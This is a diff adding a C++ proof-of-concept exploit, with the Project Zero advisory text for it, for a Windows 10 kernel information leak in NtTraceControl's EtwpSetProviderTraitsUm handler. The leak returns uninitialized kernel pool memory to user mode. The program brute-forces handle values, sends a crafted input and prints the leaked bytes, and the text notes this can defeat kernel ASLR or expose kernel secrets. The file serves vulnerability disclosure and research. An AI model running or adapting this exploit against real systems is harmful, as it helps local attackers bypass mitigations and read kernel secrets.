@@ -1,0 +1,103 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1161
+
+We have discovered that the handler of the nt!NtTraceControl system call (specifically the EtwpSetProviderTraitsUm functionality, opcode 0x1E) discloses portions of uninitialized pool memory to user-mode clients on Windows 10 systems.
+
+On our test Windows 10 32-bit workstation, an example layout of the output buffer is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 ff ff ff ff ff ff ff ff ................
+00000020: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ................
+00000030: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ................
+00000040: ff ff ff ff ff ff ff ff 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 ff ff ff ff ff ff ff ff ................
+00000070: ff ff ff ff 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ................
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode.
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region (in this case, the special byte is 0x75, or "u"):
+
+--- cut ---
+00000000: 28 00 00 00 00 00 00 00 24 f8 f7 00 00 00 00 00 (.......$.......
+00000010: 39 00 00 00 00 00 00 00 75 75 75 75 75 75 75 75 9.......uuuuuuuu
+00000020: 75 75 75 75 75 75 75 75 75 75 75 75 75 75 75 75 uuuuuuuuuuuuuuuu
+00000030: 75 75 75 75 75 75 75 75 75 75 75 75 75 75 75 75 uuuuuuuuuuuuuuuu
+00000040: 75 75 75 75 75 75 75 75 01 00 00 00 ff 00 00 00 uuuuuuuu........
+00000050: a1 03 00 00 00 00 00 00 00 00 00 00 00 80 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 75 75 75 75 75 75 75 75 ........uuuuuuuu
+00000070: 75 75 75 75 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? uuuu............
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+extern "C"
+NTSTATUS WINAPI NtTraceControl(
+    DWORD Operation,
+    LPVOID InputBuffer,
+    DWORD InputSize,
+    LPVOID OutputBuffer,
+    DWORD OutputSize,
+    LPDWORD BytesReturned);
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  BYTE data[] = "9\x00Microsoft.Windows.Kernel.KernelBase\x00\x13\x00\x01\x1asPO\xcf\x89\x82G\xb3\xe0\xdc\xe8\xc9\x04v\xba";
+  struct {
+    DWORD hevent;
+    DWORD padding1;
+    LPVOID data;
+    DWORD padding2;
+    USHORT data_size;
+    USHORT padding3;
+    DWORD padding4;
+  } Input = {
+    0, 0, data, 0, sizeof(data) - 1, 0, 0
+  };
+  BYTE Output[1024] = { /* zero padding */ };
+
+  for (DWORD handle = 0x4; handle < 0x1000; handle += 4) {
+    Input.hevent = handle;
+
+    DWORD BytesReturned = 0;
+    NTSTATUS ntst = NtTraceControl(30, &Input, sizeof(Input), Output, sizeof(Output), &BytesReturned);
+    if (NT_SUCCESS(ntst)) {
+      PrintHex(Output, BytesReturned);
+      break;
+    }
+  }
+
+  return 0;
+}
